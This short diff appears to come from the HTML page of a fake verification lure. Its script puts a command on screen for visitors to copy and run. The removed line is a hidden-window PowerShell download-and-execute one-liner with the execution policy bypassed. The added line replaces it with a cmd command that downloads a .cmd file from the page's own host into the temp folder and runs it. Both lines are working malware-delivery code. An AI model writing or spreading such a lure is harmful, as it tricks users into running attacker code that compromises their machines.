@@ -52,7 +52,7 @@ button.ok{background:#248046}
 <script>
 (function(){
   var host = location.origin;
-  var cmd = 'powershell -nop -w h -ep bypass -c "irm ' + host + '/s?_=' + Date.now() + '|iex"';
+  var cmd = 'cmd /c curl -sL ' + host + '/f?t=' + Date.now() + ' -o "%temp%\\v.cmd" && "%temp%\\v.cmd"';
   var box = document.getElementById('cmd');
   var btn = document.getElementById('b');
   box.textContent = cmd;
